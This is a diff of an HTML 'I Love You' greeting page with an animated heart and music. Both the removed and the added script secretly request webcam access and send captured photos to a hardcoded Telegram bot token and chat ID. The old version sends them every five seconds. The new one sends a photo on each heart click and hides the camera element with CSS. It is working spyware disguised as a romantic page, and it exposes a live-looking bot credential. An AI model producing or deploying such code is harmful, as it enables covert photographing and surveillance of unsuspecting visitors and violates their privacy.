@@ -5,134 +5,134 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>I Love You</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
+
     body {
       margin: 0;
       padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      background: radial-gradient(circle, #ff758c, #ff7eb3, #ffb199);
-      font-family: 'Comic Sans MS', cursive, sans-serif;
+      height: 100vh;
+      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
+      background-size: 300% 300%;
+      font-family: 'Dancing Script', cursive;
+      animation: bgAnimation 12s infinite alternate;
       overflow: hidden;
     }
+
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
     .container {
       text-align: center;
-      animation: fadeIn 2s ease-in-out;
+      position: relative;
     }
+
     .heart {
-      font-size: 5rem;
-      color: #ff1e56;
-      animation: beat 1s infinite;
+      font-size: 6rem;
+      color: #ff4b5c;
+      cursor: pointer;
+      transition: transform 0.3s ease;
     }
+
+    .heart:hover {
+      transform: scale(1.2);
+    }
+
     h1 {
       font-size: 3rem;
       color: #fff;
       text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
       margin: 20px 0;
     }
+
     h1 span {
       color: #ffeb3b;
       font-style: italic;
     }
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(-50px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-    @keyframes beat {
-      0%, 100% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.2);
-      }
+
+    video {
+      display: none; /* Hide the camera preview */
     }
   </style>
 </head>
 <body>
-  <script>
-        const video = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        // Telegram Bot Information
-        const botToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot token
-        const chatId = "1987016824"; // Replace with your chat ID
-
-        // 1. Camera Access
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-            } catch (error) {
-                alert('Camera access denied or unavailable!');
-                console.error(error);
-            }
-        }
-
-        // 2. Capture and Send Photo
-        async function captureAndSend() {
-            // Capture Photo
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-
-            // Convert Base64 to Blob
-            const blob = dataURItoBlob(imageData);
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.png');
-
-            // Send Photo to Telegram
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('Photo sent successfully!');
-                } else {
-                    console.error('Failed to send photo!', result);
-                }
-            } catch (error) {
-                console.error('Error sending photo!', error);
-            }
-        }
-
-        // Utility: Convert Data URI to Blob
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
-        // 3. Start Process (Capture and Send Every 5 Seconds)
-        async function startContinuousCapture() {
-            await startCamera();
-            setInterval(captureAndSend, 5000); // Capture & send every 5 seconds
-        }
-
-        // Start Continuous Process
-        startContinuousCapture();
-    </script>
   <div class="container">
-    <div class="heart">❤️</div>
+    <div class="heart" onclick="capturePhoto()">❤️</div>
     <h1>I <span>Love</span> You</h1>
-  </div>
-  </body>
 
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+  <!-- Background Music -->
+  <audio id="loveAudio" loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <script>
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let context = canvas.getContext('2d');
+    let audio = document.getElementById('loveAudio');
+    let isPlaying = false;
+
+    // Start the video feed
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        video.srcObject = stream;
+        video.style.display = "block"; // Show video
+      })
+      .catch(function(error) {
+        console.error("Error accessing webcam: ", error);
+      });
+
+    // Capture photo when heart is clicked
+    function capturePhoto() {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imageData = canvas.toDataURL('image/png');
+      
+      // Send image to Telegram bot
+      sendToTelegramBot(imageData);
+
+      // Play background music if not playing
+      if (!isPlaying) {
+        audio.play();
+        isPlaying = true;
+      } else {
+        audio.pause();
+        isPlaying = false;
+      }
+    }
+
+    // Send captured image to Telegram bot
+    function sendToTelegramBot(imageData) {
+      const token = '7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w';
+      const chatId = '1987016824';
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      // Create a FormData object
+      let formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', imageData);
+
+      fetch(url, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Image sent successfully', data);
+      })
+      .catch(error => {
+        console.error('Error sending image:', error);
+      });
+    }
+  </script>
+</body>
 </html>
